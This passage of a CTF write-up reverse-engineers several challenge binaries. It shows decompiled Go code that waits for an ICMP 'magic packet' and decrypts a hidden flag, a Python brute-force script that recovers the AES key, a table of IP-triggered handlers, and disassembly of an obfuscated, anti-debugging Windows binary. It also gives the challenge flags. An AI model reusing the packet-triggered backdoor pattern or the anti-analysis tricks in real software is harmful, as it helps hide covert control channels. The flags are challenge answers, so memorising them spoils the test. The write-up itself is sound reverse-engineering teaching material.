array_1;</span><br><span class="line">      device_8d.len = <span class="number">12</span>;</span><br><span class="line">      device_8d.cap = cap;</span><br><span class="line">      oldc = <span class="built_in">runtime_growslice</span>((runtime__type_1 *)&amp;RTYPE_uint8, device_8d, <span class="number">14</span>);</span><br><span class="line">      array_1 = oldc.array;</span><br><span class="line">      cap = oldc.cap;</span><br><span class="line">      key_1 = key_16;</span><br><span class="line">    &#125;</span><br><span class="line">    array_1[<span class="number">6</span>] = *(_WORD *)(key_1 + <span class="number">38</span>);</span><br><span class="line">    <span class="keyword">if</span> ( cap &lt; <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      device_8e.array = array_1;</span><br><span class="line">      device_8e.len = <span class="number">14</span>;</span><br><span class="line">      device_8e.cap = cap;</span><br><span class="line">      oldd = <span class="built_in">runtime_growslice</span>((runtime__type_1 *)&amp;RTYPE_uint8, device_8e, <span class="number">16</span>);</span><br><span class="line">      array_1 = oldd.array;</span><br><span class="line">      cap = oldd.cap;</span><br><span class="line">      key_1 = key_16;</span><br><span class="line">    &#125;</span><br><span class="line">    array_1[<span class="number">7</span>] = v38;</span><br><span class="line">    <span class="keyword">if</span> ( *(_WORD *)(key_1 + <span class="number">38</span>) == <span class="number">0x1337</span></span><br><span class="line">      &amp;&amp; __ROL2__(*(_WORD *)(key_1 + <span class="number">16</span>), <span class="number">8</span>) == <span class="number">32</span></span><br><span class="line">      &amp;&amp; *(_DWORD *)(key_1 + <span class="number">42</span>) == <span class="number">0xE55FDEC6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n0x22 &lt;= <span class="number">0x22</span> )</span><br><span class="line">        <span class="built_in">runtime_panicIndex</span>();</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(key_1 + <span class="number">34</span>) == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cap_1 = cap;</span><br><span class="line">        key = (uint8 *)array_1;</span><br><span class="line">        b_8 = <span class="built_in">runtime_newobject</span>((runtime__type_1 *)&amp;RTYPE__32_uint8);</span><br><span class="line">        *b_8 = <span class="number">0xC07EDFB429A5F151LL</span>;</span><br><span class="line">        b_8[<span class="number">1</span>] = <span class="number">0xB34E3D248F2F3B2ALL</span>;</span><br><span class="line">        b_8[<span class="number">2</span>] = <span class="number">0x8CDD9C0BCFB0ED5ALL</span>;</span><br><span class="line">        b_8[<span class="number">3</span>] = <span class="number">0xC64C43E9B0EE6CDLL</span>;</span><br><span class="line">        device.array = key;</span><br><span class="line">        device.len = <span class="number">16</span>;</span><br><span class="line">        device.cap = cap_1;</span><br><span class="line">        *(_OWORD *)&amp;promisca.len = (<span class="type">unsigned</span> __int128)<span class="built_in">crypto_aes_NewCipher</span>(device);</span><br><span class="line">        ptr = (uint8 *)<span class="built_in">runtime_makeslice</span>((runtime__type_1 *)&amp;RTYPE_uint8, <span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line">        devicea = *(string_0 *)&amp;promisca.len;</span><br><span class="line">        promisca.array = key;</span><br><span class="line">        promisca.len = <span class="number">16</span>;</span><br><span class="line">        promisca.cap = cap_1;</span><br><span class="line">        olde = <span class="built_in">crypto_cipher_NewCBCDecrypter</span>((crypto_cipher_Block)devicea, promisca);</span><br><span class="line">        ((<span class="built_in">void</span> (__golang *)(<span class="type">void</span> *, uint8 *, __int64, __int64, _QWORD *, __int64, __int64))olde.tab[<span class="number">1</span>].inter)(olde.data, ptr, <span class="number">32</span>, <span class="number">32</span>, b_8, <span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line">        deviceb = <span class="built_in">runtime_slicebytetostring</span>(<span class="number">0</span>, ptr, <span class="number">32</span>);</span><br><span class="line">        promiscb = <span class="built_in">runtime_convTstring</span>(deviceb);</span><br><span class="line">        *(_QWORD *)&amp;elem[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">        *((_QWORD *)&amp;elem[<span class="number">0</span>] + <span class="number">1</span>) = promiscb;</span><br><span class="line">        devicec.str = (uint8 *)go_itab__ptr_os_File_comma_io_Writer;</span><br><span class="line">        devicec.len = (<span class="type">int</span>)os_Stdout;</span><br><span class="line">        promiscc.array = (interface__0 *)elem;</span><br><span class="line">        promiscc.len = <span class="number">1</span>;</span><br><span class="line">        promiscc.cap = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">fmt_Fprintln</span>((io_Writer_0)devicec, promiscc);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This function keeps waiting for ICMP packets, and if the length of packet is 32, type is 0x08, identifier is 0x1337, the first int32 of payload is 0xE55FDEC6, it will try to decrypt the 32 byte cipher, using AES. The key is constructed from some data in the package. </p>
<p>Decrypt:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">n2ble</span>(<span class="params">na, n=<span class="number">8</span></span>):</span><br><span class="line">    b = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> na: b.extend(a.to_bytes(n, <span class="string">&quot;little&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b)</span><br><span class="line"></span><br><span class="line">cip = [</span><br><span class="line">    <span class="number">0xC07EDFB429A5F151</span>,</span><br><span class="line">    <span class="number">0xB34E3D248F2F3B2A</span>,</span><br><span class="line">    <span class="number">0x8CDD9C0BCFB0ED5A</span>,</span><br><span class="line">    <span class="number">0x0C64C43E9B0EE6CD</span>,</span><br><span class="line">]</span><br><span class="line">CIPHERTEXT = n2ble(cip, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">PAYLOAD = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;c6de5fe5&quot;</span>)</span><br><span class="line">IDENT_BYTES = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;3713&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload_le = <span class="built_in">int</span>.from_bytes(PAYLOAD, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">hi16 = (payload_le &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">lo16 = payload_le &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">icmp_checksum</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) % <span class="number">2</span> == <span class="number">1</span>: data += <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">2</span>):</span><br><span class="line">        w = (data[i] &lt;&lt; <span class="number">8</span>) | data[i+<span class="number">1</span>]</span><br><span class="line">        s += w</span><br><span class="line">        s = (s &amp; <span class="number">0xFFFF</span>) + (s &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    s = (s &amp; <span class="number">0xFFFF</span>) + (s &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> (~s) &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_key</span>(<span class="params">ip_bytes_6_9: <span class="built_in">bytes</span>, code: <span class="built_in">int</span>, seq_bytes: <span class="built_in">bytes</span></span>):</span><br><span class="line">    pseudo = <span class="built_in">bytes</span>([<span class="number">8</span>, code, <span class="number">0</span>, <span class="number">0</span>]) + IDENT_BYTES + seq_bytes + PAYLOAD</span><br><span class="line">    csum_be = icmp_checksum(pseudo)</span><br><span class="line">    csum_bytes = csum_be.to_bytes(<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    csum_le = <span class="built_in">int</span>.from_bytes(csum_bytes, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    a = (csum_le ^ hi16) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    b = (csum_le ^ lo16) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    key = (</span><br><span class="line">        a.to_bytes(<span class="number">2</span>, <span class="string">&quot;big&quot;</span>) +</span><br><span class="line">        ip_bytes_6_9 +</span><br><span class="line">        csum_bytes +</span><br><span class="line">        PAYLOAD +</span><br><span class="line">        IDENT_BYTES +</span><br><span class="line">        b.to_bytes(<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>: <span class="keyword">return</span> AES.new(key, AES.MODE_CBC, iv=key).decrypt(CIPHERTEXT)</span><br><span class="line"></span><br><span class="line">ip_candidates = [</span><br><span class="line">    <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;00004001&quot;</span>),</span><br><span class="line">    <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;40004001&quot;</span>),</span><br><span class="line">    <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;00008001&quot;</span>),</span><br><span class="line">    <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;40008001&quot;</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">codes = [<span class="number">0</span>]</span><br><span class="line">best = []</span><br><span class="line"><span class="keyword">for</span> ipb <span class="keyword">in</span> ip_candidates:</span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> codes:</span><br><span class="line">        <span class="keyword">for</span> seq <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">            seq_bytes = seq.to_bytes(<span class="number">2</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">            key = build_key(ipb, code, seq_bytes)</span><br><span class="line">            pt = decrypt(key)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;CMO&#123;&quot;</span> <span class="keyword">in</span> pt:</span><br><span class="line">                <span class="built_in">print</span>(pt)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><font color=deepskyblue><strong>CMO{fUn_w1th_m4g1c_p4ck3t5}</strong></font></p>
<h3 id="connected"><a href="#connected" class="headerlink" title="connected"></a>connected</h3><p>This program registered 10 IPs in main, and 9 lambda functions to parse the input:</p>
<table>
<thead>
<tr>
<th>IP_HEX</th>
<th>IP</th>
<th>Lambda Function ID</th>
<th>Received</th>
</tr>
</thead>
<tbody><tr>
<td>0x260FC72A</td>
<td>38.15.199.42</td>
<td>1</td>
<td>input</td>
</tr>
<tr>
<td>0x260FC729</td>
<td>38.15.199.41</td>
<td>2→1 (if directly call)</td>
<td>My complicated firewall rules told me to not talk to you (if directly call)</td>
</tr>
<tr>
<td>0x260FC728</td>
<td>38.15.199.40</td>
<td>3→1</td>
<td>OK</td>
</tr>
<tr>
<td>0x64191A0A</td>
<td>100.25.26.10</td>
<td>4→9→4→7→9→7→4→8→9→8→4→6→9→6→4→1<br />(if input format is msg_&lt;xxx&gt;)</td>
<td>I don’t want to talk to you (if format wrong or input wrong)</td>
</tr>
<tr>
<td>0x64191A0B</td>
<td>100.25.26.11</td>
<td>5→1</td>
<td>Okay, I did some spamming. You are welcome!</td>
</tr>
<tr>
<td>0x64191A0F</td>
<td>100.25.26.15</td>
<td>6→9→6→1</td>
<td>1 (if all bytes are printable and ascii are even) &#x2F; 0 (else)</td>
</tr>
<tr>
<td>0x400E0319</td>
<td>64.14.3.25</td>
<td>7→9→7→1</td>
<td>strlen(input)</td>
</tr>
<tr>
<td>0x400E031D</td>
<td>64.14.3.29</td>
<td>8→9→8→1</td>
<td>weak hash function</td>
</tr>
<tr>
<td>0x53305C05</td>
<td>83.48.92.5</td>
<td>- (user IP)</td>
<td>-</td>
</tr>
<tr>
<td>0x53305C08</td>
<td>83.48.92.8</td>
<td>9→1</td>
<td>xor 0x42</td>
</tr>
</tbody></table>
<p>From the table we can see function 1 is for the final output, and function 4 is the most important part. For chain 4, the constraints are: length &#x3D;&#x3D; 8, ascii &#x3D;&#x3D; even, hash &#x3D;&#x3D; 0x06022e46. A solution is: <code>:&quot;*$$*&quot;:</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    what: msg_:&quot;*$$*&quot;:</span><br><span class="line">   where: 100.25.26.10</span><br><span class="line">received: CMO&#123;secret_code_v9hcdkd2&#125;</span><br></pre></td></tr></table></figure>

<p><font color=deepskyblue><strong>CMO{secret_code_jx65692q}</strong></font></p>
<h3 id="moment"><a href="#moment" class="headerlink" title="moment"></a>moment</h3><p>The code of this program is very chaotic, and try to use debugger will make the program die before main. Note that this program has a huge init function table:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rdata:</span>00000001401128A8 <span class="comment">; const _PVFV First_</span></span><br><span class="line"><span class="symbol">.rdata:</span>00000001401128A8 First_          <span class="built_in">dq</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">.rdata:</span>00000001401128B0                 <span class="built_in">dq</span> offset ?pre_cpp_initialization@@YAXXZ</span><br><span class="line"><span class="symbol">.rdata:</span>00000001401128B8                 <span class="built_in">dq</span> offset atexit_unknown_libname_8</span><br><span class="line"><span class="symbol">.rdata:</span>00000001401128C0                 <span class="built_in">dq</span> offset longfunc_3C615</span><br><span class="line"><span class="symbol">.rdata:</span>00000001401128C8                 <span class="built_in">dq</span> offset CRC32_Choice</span><br><span class="line"><span class="symbol">.rdata:</span>00000001401128D0                 <span class="built_in">dq</span> offset pf_1</span><br><span class="line"><span class="symbol">.rdata:</span>00000001401128D8                 <span class="built_in">dq</span> offset pf_2</span><br><span class="line"><span class="symbol">.rdata:</span>00000001401128E0                 <span class="built_in">dq</span> offset xyobfunc</span><br><span class="line"><span class="symbol">.rdata:</span>00000001401128E8                 <span class="built_in">dq</span> offset SetConsole</span><br><span class="line"><span class="symbol">.rdata:</span>00000001401128F0                 <span class="built_in">dq</span> offset fread_5851F42D4C957F2D</span><br><span class="line"><span class="symbol">.rdata:</span>00000001401128F8                 <span class="built_in">dq</span> offset OpenSCManagerService</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112900</span>                 <span class="built_in">dq</span> offset longfunc_10735</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112908</span>                 <span class="built_in">dq</span> offset atexit_1400BFFD0</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112910</span>                 <span class="built_in">dq</span> offset atexit_d_1400BFF60</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112918</span>                 <span class="built_in">dq</span> offset atexit_1400BFEA0</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112920</span>                 <span class="built_in">dq</span> offset atexit_140102BA0</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112928</span>                 <span class="built_in">dq</span> offset atexit_140102A50</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112930</span>                 <span class="built_in">dq</span> offset atexit_d_140102A20</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112938</span>                 <span class="built_in">dq</span> offset atexit_d_1401029F0</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112940</span>                 <span class="built_in">dq</span> offset atexit_d_1401029C0</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112948</span>                 <span class="built_in">dq</span> offset atexit_1401028D0</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112950</span>                 <span class="built_in">dq</span> offset atexit_140102810</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112958</span>                 <span class="built_in">dq</span> offset CreateEvent_14012B3D8_atexit_140102800</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112960</span>                 <span class="built_in">dq</span> offset GetCurrentThread_14012B420</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112968</span>                 <span class="built_in">dq</span> offset GetCurrentThread_14012B470</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140112970</span>                 <span class="built_in">dq</span> offset GetCurrentThread_14012B4C0</span><br></pre></td></tr></table></figure>

<p><code>longfunc_3C615</code> compiles a regex to find all *.dll files at the beginning. However, in debugging, the program accessed a wrong memory addr at <code>.text:000000014001916D call sub_1400BB6A0</code> in <code>longfunc_3C615</code>, and this function <code>sub_1400BB6A0</code> is very weird:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000001400BB6A0 <span class="comment">; _QWORD *__fastcall sub_1400BB6A0(_QWORD *)</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6A0 sub_1400BB6A0   proc <span class="built_in">near</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6A0 var_40          = <span class="built_in">qword</span> <span class="built_in">ptr</span> -<span class="number">40h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6A0 arg_10          = <span class="built_in">qword</span> <span class="built_in">ptr</span>  <span class="number">20h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6A0 arg_18          = <span class="built_in">qword</span> <span class="built_in">ptr</span>  <span class="number">28h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6A0 <span class="comment">; __unwind &#123; // __C_specific_handler</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6A0                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6A1                 <span class="keyword">push</span>    <span class="built_in">r15</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6A3                 <span class="keyword">push</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6A5                 <span class="keyword">push</span>    <span class="built_in">r13</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6A7                 <span class="keyword">push</span>    <span class="built_in">r12</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6A9                 <span class="keyword">push</span>    <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6AA                 <span class="keyword">push</span>    <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6AB                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6AC                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">28h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6B0                 <span class="keyword">lea</span>     <span class="built_in">rbp</span>, [<span class="built_in">rsp</span>+<span class="number">20h</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6B5                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6B8                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">40h</span>+arg_10], <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6BC                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">40h</span>+arg_18], <span class="built_in">r9</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6C0                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+<span class="number">40h</span>+arg_10]</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6C4                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">40h</span>+var_40], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6C8                 <span class="keyword">call</span>    sub_1400BEF20</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6CD                 <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6CF                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6D4                 <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6D6                 <span class="keyword">mov</span>     <span class="built_in">r8d</span>, <span class="number">3000h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6DC                 <span class="keyword">mov</span>     <span class="built_in">r9d</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6E2                 <span class="keyword">call</span>    <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6E4                 <span class="keyword">mov</span>     [<span class="built_in">rsi</span>], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6E7                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6ED                 <span class="keyword">mov</span>     <span class="built_in">r15d</span>, <span class="number">77190988h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6F3                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="number">99A33F9AD5D7800Bh</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB6FD                 <span class="keyword">nop</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB700 loc_1400BB700:                          <span class="comment">; CODE XREF: sub_1400BB6A0:loc_1400BB760↓j</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB700                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+<span class="number">40h</span>+var_40]</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB704                 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="built_in">rax</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB708                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">40h</span>+var_40], <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB70C                 <span class="keyword">cmp</span>     <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rsi</span>], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB710                 <span class="keyword">jz</span>      short loc_1400BB77C</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB712                 <span class="keyword">movsxd</span>  <span class="built_in">r13</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB715                 <span class="keyword">shl</span>     <span class="built_in">r13</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB719                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, unk_140111680</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB720                 <span class="keyword">lea</span>     <span class="built_in">r12</span>, [<span class="built_in">rax</span>+<span class="built_in">r13</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB724                 <span class="keyword">mov</span>     <span class="built_in">r14d</span>, <span class="built_in">ds</span>:<span class="number">7FFE02F8h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB72C                 <span class="keyword">xor</span>     <span class="built_in">r14d</span>, <span class="built_in">r15d</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB72F                 <span class="keyword">add</span>     <span class="built_in">r14d</span>, <span class="number">0CD42AD3Ah</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB736 loc_1400BB736:                          <span class="comment">; DATA XREF: .rdata:00000001401208D0↓o</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB736 <span class="comment">;   __try &#123; // __except at 1400BB764</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB736                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="number">9626887h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB73B                 <span class="keyword">call</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB73E                 <span class="keyword">call</span>    nullsub_1</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB743                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB746                 <span class="keyword">call</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB749 loc_1400BB749:                          <span class="comment">; DATA XREF: .rdata:00000001401208D0↓o</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB749                 <span class="keyword">xor</span>     <span class="built_in">al</span>, <span class="number">9Ah</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB74B                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, [<span class="built_in">rsi</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB74E                 <span class="keyword">mov</span>     [<span class="built_in">rcx</span>+<span class="built_in">rbx</span>], <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB751                 <span class="keyword">jmp</span>     <span class="built_in">qword</span> <span class="built_in">ptr</span> <span 